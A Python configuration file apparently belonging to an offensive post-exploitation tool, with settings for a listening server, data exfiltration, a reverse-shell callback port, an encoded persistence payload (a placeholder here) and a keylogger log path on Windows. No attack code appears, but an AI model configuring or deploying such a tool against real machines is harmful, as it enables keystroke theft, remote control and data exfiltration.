#SERVER CONFIG
#TO GENERATE AN SSL CERT: openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
server = {
	'SERVER_LISTEN_ON_LOCAL_IP':'0.0.0.0',
	'SERVER_LISTEN_ON_LOCAL_PORT':'8000',
	'SERVER_PROTOCOL':'http',
	'CERT_PEMFILE':'certs/cert.pem',
	'CERT_KEYFILE':'certs/key.pem'
}

#DATA EXFILTRATION CONFIG
exfiltration = {
	'SERVER_EXTERNAL_IP':'your_external_ip',
	'SERVER_EXTERNAL_PORT':'8000',
}

#REVERSE SHELL CONFIG
reverseshell = {
	'SERVER_EXTERNAL_IP':'your_external_ip',
	'SERVER_EXTERNAL_PORT':'4446',
}

#PERSISTENCE TASK CONFIG
persistence = {
	'BASE64_ENCODED_PAYLOAD_UTF16LE':'eQBvAHUAcgBfAGIAYQBzAGUANgA0AF8AdQB0AGYALQAxADYATABFAF8AZQBuAGMAbwBkAGUAZABfAHAAYQB5AGwAbwBhAGQA'
}

#KEYLOGGER CONFIG
logger = {
	'OUTPUT_PATH':'C:\\Users\\Public\\logs.txt'
}
